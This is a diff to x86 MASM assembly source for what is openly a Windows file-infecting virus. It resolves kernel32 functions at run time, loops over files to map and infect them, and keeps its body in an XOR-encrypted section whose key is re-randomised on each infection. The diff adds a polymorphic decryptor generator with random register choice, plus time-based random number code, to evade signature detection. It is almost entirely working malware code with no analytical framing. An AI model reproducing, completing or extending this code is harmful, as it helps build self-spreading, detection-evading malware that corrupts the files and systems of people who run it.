@@ -5,11 +5,7 @@
 option casemap:none
 
       include windows.inc
-      ;include user32.inc
 	  include kernel32.inc
-
-	  ;include handle_file.inc
-
 
       includelib user32.lib
       includelib kernel32.lib
@@ -34,9 +30,9 @@ APPLYXORVALUE	macro addrbegin, addrend, value
 
 	.WHILE ecx > 0
 		
-		mov ah, byte ptr [esi]
+		mov al, byte ptr [esi]
 		xor eax, value
-		mov byte ptr [esi], ah
+		mov byte ptr [esi], al
 
 		inc esi
 		dec ecx
@@ -58,7 +54,128 @@ main:
 	mov ebx, [esp]
 	jmp crypted_code_end
 
+applyxorvalue	proc addrbegin:dword, addrend:dword, value:dword
+
+	uncryptor_buffer db 75 DUP(90h)
+	;; ^ cree un buffer de xx octets avec l'instruction Nop
+	pusha
+
+
+	xor eax, eax
+	mov esi, addrbegin
+	mov edi, addrbegin
+	mov ecx, addrend
+	sub ecx, addrbegin
+
+xorloop:
+	lodsb
+	xor eax, value
+	stosb
+	loop xorloop
+
+
+
+	popa
+
+	ret
+applyxorvalue	endp
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;
+;;; CRYPTED CODE STARTS HERE
+;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 crypted_code_begin:
+;; "global variables", but our section needs the write attribute in order for this to work
+;; post-build event takes care of that
+	procGetSystemTime dd 0h
+
+getrandomnumber proc maxval:dword
+	push ebx
+	push ecx
+	push edx
+	sub esp, sizeof(SYSTEMTIME) ;; structure buffer
+	
+	xor eax, eax
+	mov ebx, esp
+	push ebx
+	call procGetSystemTime
+	xor edx, edx
+	xor eax, eax
+	mov ecx, maxval
+
+	assume ebx:ptr SYSTEMTIME
+	mov ax, [ebx].wMilliseconds
+	assume ebx:nothing
+
+	;shl eax, 010h		; last two bytes are now 0
+	mov ebx, esp		; we add some randomness: take current esp value
+	xor ebx, ebp		; just do some random stuff
+	and ebx, 0FFFFh		; consider the last two bytes
+	shl ebx, 010h
+	add eax, ebx		; add them to eax
+
+	div ecx
+
+	mov eax, edx
+
+	add esp, sizeof(SYSTEMTIME) ;; clean structure buffer
+	pop edx
+	pop ecx
+	pop ebx
+	ret
+getrandomnumber endp
+
+decryptorGenerator proc ;decryptoraddr:dword, decryptorvalue:dword, cryptaddrbegin:dword, cryptaddrend:dword
+
+	jmp startgen
+
+	__ValueReg		db	0FFh
+	__CrptBegReg	db	0FFh
+	__CrptSizeReg	db	0FFh
+
+	;; This is a 15bytes (true size to be determined) code buffer holding NOPs for now.
+	decryptoraddr db 15 DUP(090h)
+
+	;; this is where the code for each part of the XORer is stored.
+	;; push the adresses on the stack, then swap them randomly, and finally write them
+	;; to the xorer
+
+	__MoveValue	db 0B8h
+	__MoveBeg	db 0B8h
+	__MoveSize	db 0B8h
+
+
+
+startgen:
+	mov edi, offset decryptoraddr
+	invoke getrandomnumber, 04h
+	mov byte ptr [__ValueReg]	, al	; stores the chosen register in __ValueReg
+	mov byte ptr [__CrptBegReg]	, al	; for the sake of following while loop
+	mov byte ptr [__CrptSizeReg], al	; same
+
+	;; mov <reg32>, crypt_key
+	or al, 0B8h	  ; mov <reg32>,
+	stosb
+	mov eax, 044h ; crypt_key
+	stosd
+
+	.WHILE __ValueReg == __CrptBegReg
+		invoke getrandomnumber, 04h
+		mov byte ptr [__CrptBegReg], al
+	.ENDW
+
+
+
+	mov al, 0C3h ; ret
+	stosb
+
+	mov eax, offset decryptoraddr
+	call eax
+
+	ret
+decryptorGenerator endp
+
 loadproc	macro dest, hmodule, loadproc, strproc
 	push eax
 	
@@ -100,12 +217,16 @@ movloc	macro	dest, src
 addloc macro	dest, src
 
 	push edi
+
 	mov edi, dest
 	add edi, src
 	mov dest, edi
+	
 	pop edi
 
 	   endm
+
+
 
 extractKernel32PEHeader proc delta:dword
 
@@ -227,9 +348,9 @@ postMappingOperations proc pointerToInfectionCode:dword
 	sub eax, main						;; eax now holds the offset to crypt_key_value in terms of code
 
 	add ebx, eax						;; ebx now has the address of crypt_key_value in the infected file
-	inc byte ptr[ebx]					;; increment it (value will lose itself when infection propagates)
-	xor eax, eax
-	mov al, byte ptr [ebx]
+	invoke getrandomnumber, 0FFFFFFFFh
+	mov byte ptr[ebx], al					
+	and eax, 0FFh
 	mov iXorValue, eax
 
 	GETLABELOFFSET main, crypted_code_begin, offsetCryptedCode
@@ -248,6 +369,23 @@ postMappingOperations proc pointerToInfectionCode:dword
 	pop eax
 	ret
 postMappingOperations endp
+
+testproc proc
+
+	push 0h
+blah:pop eax
+	
+	mov edx, 0h
+	mov edx, 0h
+	bleh:mov edx, 0h
+	;;mov eax, uncryptor_buffer
+
+
+
+	ret
+
+testproc endp
+
 
 filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword
 	local findFileData:WIN32_FIND_DATA
@@ -279,22 +417,30 @@ filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword
 	strMapViewOfFile		db "MapViewOfFile",0		; size = ,
 	strUnmapViewOfFile		db "UnmapViewOfFile",0		; size = ,
 	strCloseHandle			db "CloseHandle",0			; size = ,
+	strGetSystemTime		db "GetSystemTime",0
 
 filesLoopInit:
 
-	mov esi, [esp]
+	mov esi, dword ptr [esp]
 	mov localdelta, esi
 	;movloc localdelta, [esp]
 
-	loadprocoff prcFindFirstFile, k32hmodule, prcGetProcAddr, localdelta, 06h
-	;;loadproc prcFindFirstFile, k32hmodule, prcGetProcAddr, offset strFindFirstFile
-	loadproc prcFindNextFile, k32hmodule, prcGetProcAddr, offset strFindNextFile
-	loadproc prcFindClose, k32hmodule, prcGetProcAddr, offset strFindClose
-	loadproc prcCreateFile, k32hmodule, prcGetProcAddr, offset strCreateFile
-	loadproc prcCreateFileMapping, k32hmodule, prcGetProcAddr, offset strCreateFileMapping
-	loadproc prcMapViewOfFile, k32hmodule, prcGetProcAddr, offset strMapViewOfFile
-	loadproc prcUnmapViewOfFile, k32hmodule, prcGetProcAddr, offset strUnmapViewOfFile
-	loadproc prcCloseHandle, k32hmodule, prcGetProcAddr, offset strCloseHandle
+	;;loadprocoff prcFindFirstFile, k32hmodule, prcGetProcAddr, localdelta, 06h
+	loadproc prcFindFirstFile,		k32hmodule, prcGetProcAddr, offset strFindFirstFile
+	loadproc prcFindNextFile,		k32hmodule, prcGetProcAddr, offset strFindNextFile
+	loadproc prcFindClose,			k32hmodule, prcGetProcAddr, offset strFindClose
+	loadproc prcCreateFile,			k32hmodule, prcGetProcAddr, offset strCreateFile
+	loadproc prcCreateFileMapping,	k32hmodule, prcGetProcAddr, offset strCreateFileMapping
+	loadproc prcMapViewOfFile,		k32hmodule, prcGetProcAddr, offset strMapViewOfFile
+	loadproc prcUnmapViewOfFile,	k32hmodule, prcGetProcAddr, offset strUnmapViewOfFile
+	loadproc prcCloseHandle,		k32hmodule, prcGetProcAddr, offset strCloseHandle
+	
+
+	mov esi, offset procGetSystemTime
+	loadproc ebx, k32hmodule, prcGetProcAddr, offset strGetSystemTime
+	mov dword ptr[esi], ebx
+
+	invoke decryptorGenerator
 
 	;invoke FindFirstFile, offset PatternStr, addr findFileData
 	lea edi, findFileData
@@ -480,19 +626,24 @@ startinf:
 
 	xor eax, eax
 	;invoke extractKernel32PEHeader, ebx
+	;invoke testproc
 	invoke beginInfection, ebx
 	jmp final_return
 
 crypted_code_end:
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;
+;;; CRYPTED CODE ENDS HERE
+;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
 	jmp start_uncrypt
 crypt_key_value:
-	CKV db 0	
+	CKV db 00h	
 
 start_uncrypt:
-	;mov eax, CKV
-	mov ecx, crypted_code_begin
-	;APPLYXORVALUE crypted_code_begin, crypted_code_end, CKV
-	
+
+	;invoke applyxorvalue, offset crypted_code_begin, offset crypted_code_end, CKV
 	jmp startinf
 
 final_return:
